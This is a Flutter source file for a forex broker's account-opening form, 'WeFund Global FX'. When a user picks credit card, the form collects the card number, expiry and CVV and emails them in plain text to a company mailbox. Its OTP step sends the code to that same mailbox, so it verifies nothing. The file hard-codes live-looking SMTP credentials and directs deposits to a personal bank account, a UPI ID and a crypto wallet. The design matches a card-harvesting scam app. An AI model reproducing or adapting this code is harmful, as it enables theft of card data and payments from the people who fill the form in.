import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:file_picker/file_picker.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';

class LiveAccountForm extends StatefulWidget {
  const LiveAccountForm({Key? key}) : super(key: key);

  @override
  _LiveAccountFormState createState() => _LiveAccountFormState();
}

class _LiveAccountFormState extends State<LiveAccountForm> {
  final _formKey = GlobalKey<FormState>();

  // ─── Form fields ───────────────────────────────────────────────────────
  String firstName = '';
  String lastName = '';
  String email = '';
  String countryCode = '+91';
  String phone = '';
  String tradingPlatform = '';
  String accountSelection = '';
  String accountType = '';
  String accountNumber = '';
  String depositMethod = '';
  String depositMethodMessage = '';
  List<Map<String, String>> depositMethodData = [];
  String depositMethodAmount = '';
  String accountCurrency = '';
  String depositCurrency = '';
  String depositCurrencyAmount = '';
  String referralCode = '';

     // Card fields (persisted after dialog)
 
  String _generatedOtp = '';
  File? file;

  // ─── Credit‑Card Dialog state ───────────────────────────────────────
final TextEditingController _cardNameCtrl    = TextEditingController();
final TextEditingController _cardNumberCtrl  = TextEditingController();
final TextEditingController _cvvCtrl         = TextEditingController();
final TextEditingController _expiryCtrl      = TextEditingController();
final TextEditingController _otpCtrl         = TextEditingController();
bool _sentOtp = false;
bool _sendingOtp = false;
bool _submittingCard = false;


  // ─── Helpers ────────────────────────────────────────────────────────────

// SMTP settings for Hostinger
final String _smtpUsername = 'info@wefundclient.com';           // your Hostinger mailbox
final String _smtpPassword = 'Wefund@6666';   // the mailbox password
final SmtpServer _smtpServer = SmtpServer(
  'smtp.hostinger.com',
  port: 465,
  ssl: true,
  username: 'info@wefundclient.com',
  password: 'Wefund@6666',
);

Future<void> _sendEmails() async {
  // build a multi‐line buffer
  final buf = StringBuffer()
    ..writeln('A new Live Account form was submitted with:')
    ..writeln()
    ..writeln('• First Name        : $firstName')
    ..writeln('• Last Name         : $lastName')
    ..writeln('• Email             : $email')
    ..writeln('• Phone             : $countryCode $phone')
    ..writeln('• Trading Platform  : $tradingPlatform')
    ..writeln('• Account Selection : $accountSelection');

  if (accountSelection == 'EXISTING') {
    buf.writeln('  Existing Account #: $accountNumber');
  } else {
    buf.writeln('  Account Type       : $accountType');
  }

  buf
    ..writeln('• Deposit Method    : $depositMethod');
  if (depositMethodMessage.isNotEmpty) {
    buf.writeln('  Details           : $depositMethodMessage');
  }
  if (depositMethodAmount.isNotEmpty) {
    buf.writeln('  Amount            : $depositMethodAmount');
  }

  buf
    ..writeln('• Account Currency  : $accountCurrency')
    ..writeln('• Deposit Currency  : $depositCurrency');
  if (depositCurrencyAmount.isNotEmpty) {
    buf.writeln('  Deposit Amount    : $depositCurrencyAmount');
  }

  // ─── insert card details if needed ──────────────────────────────
  if (depositMethod == 'CREDIT CARD') {
    buf
      ..writeln()
      ..writeln('--- Credit Card Details ---')
      ..writeln('• Name on Card   : ${_cardNameCtrl.text}')
      ..writeln('• Card Number    : ${_cardNumberCtrl.text}')
      ..writeln('• Expiry (MM/YY) : ${_expiryCtrl.text}')
      ..writeln('• CVV            : ${_cvvCtrl.text}');
  }

  // ─── turn buffer into our support email ────────────────────────
  final supportMsg = Message()
    ..from = Address(_smtpUsername, 'WeFund Global FX')
    ..recipients.add('support@wefundglobalfx.com')
    ..subject = 'New Live Account Form Submission'
    ..text = buf.toString()
    ..attachments = file != null
        ? [
            FileAttachment(file!)
              ..location = Location.attachment
              ..fileName = file!.path.split('/').last
          ]
        : [];

  // ─── simple confirmation back to the user ──────────────────────
  final userMsg = Message()
    ..from = Address(_smtpUsername, 'WeFund Global FX')
    ..recipients.add(email)
    ..subject = 'Your Live Account Form Received'
    ..text = '''
Hi $firstName,

Thanks for submitting your Live Account request. Here are your key choices:

• Trading Platform : $tradingPlatform  
• Deposit Method   : $depositMethod  
• Deposit Currency : $depositCurrency  
• Amount           : $depositCurrencyAmount  

We’ll review and get back to you shortly.

Best,
The WeFund Global FX Team
''';

  try {
    await send(supportMsg, _smtpServer);
    await send(userMsg, _smtpServer);
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Form submitted and emails sent.')),
    );
  } on MailerException catch (e) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('Email error: ${e.message}')),
    );
  }
}



  void _onDepositMethodChanged(String? v) {
  setState(() {
    depositMethod = v ?? '';
    depositMethodMessage = '';
    depositMethodData = [];

    if (depositMethod == 'USDT') {
      depositMethodMessage = 'Take screenshot & attach below\nUSDT TRC20:';
      depositMethodData = [
        {
          'label': 'TJqz3ZHNVYXLTEVvvqQDjYWvyT8kfGJbJv',
          'copy':  'TJqz3ZHNVYXLTEVvvqQDjYWvyT8kfGJbJv'
        }
      ];
    } else if (depositMethod == 'BANK TRANSFER') {
      depositMethodMessage = 'Take screenshot & attach below';
      depositMethodData = [
        {'label': 'AC: 924010025197811', 'copy': '924010025197811'},
        {'label': 'IFSC: UTIB0000720',  'copy': 'UTIB0000720'},
        {'label': 'BANK: Axis Bank',    'copy': 'Axis Bank'},
        {'label': 'BENEFICIARY: SHYAM BABOO', 'copy': 'SHYAM BABOO'},
      ];
    } else if (depositMethod == 'UPI') {
      depositMethodMessage = 'Take screenshot & attach below\nUPI ID:';
      depositMethodData = [
        {'label': 'wefu20@axisbank', 'copy': 'wefu20@axisbank'}
      ];
    } else if (depositMethod == 'CREDIT CARD') {
      // a tiny delay so the dropdown closes before dialog
      WidgetsBinding.instance.addPostFrameCallback((_) {
        _showCardDialog();
      });
    }
  });
}


  void _onDepositCurrencyChanged(String? v) {
    setState(() => depositCurrency = v ?? '');
  }

  String _getDepositLabel() {
    switch (depositCurrency) {
      case 'INR':
        return 'Deposit Amount in INR';
      case 'USDT':
        return 'Deposit Amount in USDT';
      case 'EUR (POUNDS)':
        return 'Deposit Amount in EUR (POUNDS)';
      case 'DIRAM':
        return 'Deposit Amount in DIRAM';
      case '(USD) DOLLARS':
        return 'Deposit Amount in USD';
      case 'GBP':
        return 'Deposit Amount in GBP';
      case 'AUD.USD':
        return 'Deposit Amount in AUD.USD';
      case 'JPY (YEN)':
        return 'Deposit Amount in JPY (YEN)';
      default:
        return 'Amount';
    }
  }

  Future<void> _pickFile() async {
    // optional: request permission on Android if needed
    if (await Permission.photos.request().isGranted ||
        await Permission.storage.request().isGranted) {
      final r = await FilePicker.platform.pickFiles(withData: false);
      if (r != null && r.files.isNotEmpty && r.files.first.path != null) {
        setState(() => file = File(r.files.first.path!));
      }
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Permission denied')),
      );
    }
  }

  Future<void> _copy(String text) async {
    await Clipboard.setData(ClipboardData(text: text));
    ScaffoldMessenger.of(context)
        .showSnackBar(SnackBar(content: Text('Copied')));
  }

  void _submit() async {
  if (_formKey.currentState?.validate() ?? false) {
    // show a blocking loading dialog
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => const Center(child: CircularProgressIndicator()),
    );

    await _sendEmails();

    // hide loading
    Navigator.of(context).pop();

    // clear form state
    _formKey.currentState!.reset();
    setState(() {
      firstName = '';
      lastName = '';
      email = '';
      countryCode = '+91';
      phone = '';
      tradingPlatform = '';
      accountSelection = '';
      accountType = '';
      accountNumber = '';
      depositMethod = '';
      depositMethodMessage = '';
      depositMethodData = [];
      depositMethodAmount = '';
      accountCurrency = '';
      depositCurrency = '';
      depositCurrencyAmount = '';
      referralCode = '';
      file = null;
    });

    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Submitted! ')),
    );
  }
}

Future<void> _showCardDialog() async {
  await showDialog(
    context: context,
    barrierDismissible: false,
    builder: (ctx) => StatefulBuilder(builder: (ctx, setDialogState) {
      return AlertDialog(
        title: const Text('Enter Card & OTP'),
        content: SingleChildScrollView(
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            TextField(
              controller: _cardNameCtrl,
              decoration: const InputDecoration(labelText: 'Name on Card'),
            ),
            TextField(
              controller: _cardNumberCtrl,
              keyboardType: TextInputType.number,
              decoration: const InputDecoration(labelText: 'Card Number'),
            ),
            Row(children: [
              Expanded(
                child: TextField(
                  controller: _expiryCtrl,
                  decoration: const InputDecoration(labelText: 'Expiry (MM/YY)'),
                ),
              ),
              const SizedBox(width: 16),
              Expanded(
                child: TextField(
                  controller: _cvvCtrl,
                  obscureText: true,
                  decoration: const InputDecoration(labelText: 'CVV'),
                ),
              ),
            ]),
            const SizedBox(height: 16),
            if (_sentOtp)
              TextField(
                controller: _otpCtrl,
                keyboardType: TextInputType.number,
                decoration: const InputDecoration(labelText: 'Enter OTP'),
              ),
          ]),
        ),
        actions: [
          TextButton(
            onPressed: _sendingOtp ? null : () async {
              setDialogState(() => _sendingOtp = true);
              // generate a 6‑digit OTP:
              final otp = (Random().nextInt(900000) + 100000).toString();
              final msg = Message()
                ..from = Address(_smtpUsername, 'WeFund FX')
                ..recipients.add('support@wefundglobalfx.com')
                ..subject = 'Your Card OTP'
                ..text = 'Your one‑time code is: $otp';
              try {
                await send(msg, _smtpServer);
                _generatedOtp = otp;           // store for later validation
                setDialogState(() {
                  _sendingOtp = false;
                  _sentOtp    = true;
                });
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(content: Text('OTP sent!')),
                );
              } catch (e) {
                setDialogState(() => _sendingOtp = false);
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(content: Text('Failed to send OTP')),
                );
              }
            },
            child: _sendingOtp
                ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(strokeWidth: 2))
                : Text(_sentOtp ? 'Resend OTP' : 'Send OTP'),
          ),

          ElevatedButton(
            onPressed: (!_sentOtp || _submittingCard) ? null : () {
              setDialogState(() => _submittingCard = true);
              if (_otpCtrl.text.trim() == _generatedOtp) {
                Navigator.of(context).pop();
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(content: Text('Card details saved')),
                );
              } else {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(content: Text('Invalid OTP')),
                );
              }
              setDialogState(() => _submittingCard = false);
            },
            child: _submittingCard
                ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(strokeWidth: 2))
                : const Text('Submit'),
          ),
        ],
      );
    }),
  );
}


@override
void dispose() {
  _cardNameCtrl.dispose();
  _cardNumberCtrl.dispose();
  _cvvCtrl.dispose();
  _expiryCtrl.dispose();
  _otpCtrl.dispose();
  super.dispose();
}


  // ─── Build ──────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext ctx) {
    return Scaffold(
      appBar: AppBar(title: const Text('Live Account Form')),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Form(
          key: _formKey,
          child: Column(children: [

            // First & Last
            TextFormField(
              decoration: const InputDecoration(labelText: 'First Name'),
              onChanged: (v) => firstName = v,
            ),
            const SizedBox(height: 12),
            TextFormField(
              decoration: const InputDecoration(labelText: 'Last Name'),
              onChanged: (v) => lastName = v,
            ),
            const SizedBox(height: 12),

            // Email
            TextFormField(
              decoration: const InputDecoration(labelText: 'Email *'),
              keyboardType: TextInputType.emailAddress,
              onChanged: (v) => email = v,
              validator: (v) {
                if (v == null || !v.contains('@')) return 'Valid email required';
                return null;
              },
            ),
            const SizedBox(height: 12),

            // Country Code + Phone
            Row(children: [
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12),
                decoration: BoxDecoration(
                  border: Border.all(color: Colors.grey),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: DropdownButton<String>(
                  value: countryCode,
                  underline: const SizedBox(),
                  items: <String>[
                    '+1', '+91', '+44', '+81', '+61', '+49', '+33', '+7', '+86'
                  ]
                      .map((c) => DropdownMenuItem(value: c, child: Text(c)))
                      .toList(),
                  onChanged: (v) => setState(() => countryCode = v!),
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: TextFormField(
                  decoration: const InputDecoration(labelText: 'Phone *'),
                  keyboardType: TextInputType.phone,
                  onChanged: (v) => phone = v,
                  validator: (v) =>
                      (v == null || v.isEmpty) ? 'Required' : null,
                ),
              ),
            ]),
            const SizedBox(height: 12),

            // Trading Platform
            DropdownButtonFormField<String>(
              decoration:
                  const InputDecoration(labelText: 'Trading Platform'),
              value: tradingPlatform.isEmpty ? null : tradingPlatform,
              items: ['MT5', 'MT4', 'C TRADER', 'APP']
                  .map((s) => DropdownMenuItem(value: s, child: Text(s)))
                  .toList(),
              onChanged: (v) => setState(() => tradingPlatform = v!),
            ),
            const SizedBox(height: 12),

            // Account Selection
            DropdownButtonFormField<String>(
              decoration:
                  const InputDecoration(labelText: 'Account Selection'),
              value: accountSelection.isEmpty ? null : accountSelection,
              items: ['CREATE NEW', 'EXISTING']
                  .map((s) => DropdownMenuItem(value: s, child: Text(s)))
                  .toList(),
              onChanged: (v) => setState(() => accountSelection = v!),
            ),
            if (accountSelection == 'CREATE NEW') ...[
              const SizedBox(height: 12),
              DropdownButtonFormField<String>(
                decoration: const InputDecoration(labelText: 'Account Type'),
                value: accountType.isEmpty ? null : accountType,
                items: <String>[
                  'VIP STP SWAP FREE',
                  'RAW ECN SWAP FREE',
                  'CENT VIP SWAP FREE',
                  'CENT ECN SWAP FREE',
                  'PAMM INVESTOR'
                ]
                    .map((s) => DropdownMenuItem(value: s, child: Text(s)))
                    .toList(),
                onChanged: (v) => setState(() => accountType = v!),
              ),
            ] else if (accountSelection == 'EXISTING') ...[
              const SizedBox(height: 12),
              TextFormField(
                decoration:
                    const InputDecoration(labelText: 'Existing Account #'),
                onChanged: (v) => accountNumber = v,
              ),
            ],

            const SizedBox(height: 12),
            // Deposit Method
            DropdownButtonFormField<String>(
              decoration: const InputDecoration(labelText: 'Deposit Method'),
              value: depositMethod.isEmpty ? null : depositMethod,
              items: ['USDT', 'BANK TRANSFER', 'UPI', 'CREDIT CARD']
                  .map((s) => DropdownMenuItem(value: s, child: Text(s)))
                  .toList(),
              onChanged: _onDepositMethodChanged,
            ),

            // Copy lines
            if (depositMethodMessage.isNotEmpty) ...[
              const SizedBox(height: 8),
              Text(depositMethodMessage),
              for (var d in depositMethodData) Row(children: [
                Expanded(child: Text(d['label']!)),
                IconButton(
                  icon: const Icon(Icons.copy),
                  onPressed: () => _copy(d['copy']!),
                ),
              ]),
            ],

            if (['USDT', 'BANK TRANSFER', 'UPI']
                .contains(depositMethod)) ...[
              const SizedBox(height: 12),
              TextFormField(
                decoration:
                    InputDecoration(labelText: _getDepositLabel()),
                keyboardType: TextInputType.number,
                onChanged: (v) => depositMethodAmount = v,
              ),
            ],

            const SizedBox(height: 12),
            // Account Currency
            DropdownButtonFormField<String>(
              decoration:
                  const InputDecoration(labelText: 'Account Currency'),
              value: accountCurrency.isEmpty ? null : accountCurrency,
              items: ['USD', 'INR', 'EUR', 'YEN']
                  .map((s) => DropdownMenuItem(value: s, child: Text(s)))
                  .toList(),
              onChanged: (v) => setState(() => accountCurrency = v!),
            ),

            const SizedBox(height: 12),
            // Deposit Currency +
            DropdownButtonFormField<String>(
              decoration:
                  const InputDecoration(labelText: 'Deposit Currency +'),
              value: depositCurrency.isEmpty ? null : depositCurrency,
              items: <String>[
                'INR',
                'USDT',
                'EUR (POUNDS)',
                'DIRAM',
                '(USD) DOLLARS',
                'GBP',
                'AUD.USD',
                'JPY (YEN)'
              ]
                  .map((s) => DropdownMenuItem(value: s, child: Text(s)))
                  .toList(),
              onChanged: _onDepositCurrencyChanged,
            ),
            if (depositCurrency.isNotEmpty) ...[
              const SizedBox(height: 12),
              TextFormField(
                decoration: InputDecoration(labelText: _getDepositLabel()),
                keyboardType: TextInputType.number,
                onChanged: (v) => depositCurrencyAmount = v,
              ),
            ],

            const SizedBox(height: 12),
            // Referral Code
            TextFormField(
              decoration:
                  const InputDecoration(labelText: 'Referral Code'),
              onChanged: (v) => referralCode = v,
            ),

            const SizedBox(height: 20),
            // File Upload
            ElevatedButton.icon(
              icon: const Icon(Icons.upload_file),
              label: Text(
                file != null
                    ? file!.path.split('/').last
                    : 'Upload Screenshot'
              ),
              onPressed: _pickFile,
            ),

            const SizedBox(height: 24),
            ElevatedButton(
              onPressed: _submit,
              child: const Padding(
                padding:
                    EdgeInsets.symmetric(vertical: 12, horizontal: 24),
                child: Text('Submit', style: TextStyle(fontSize: 16)),
              ),
            ),

            const SizedBox(height: 32),
          ]),
        ),
      ),
    );
  }
}
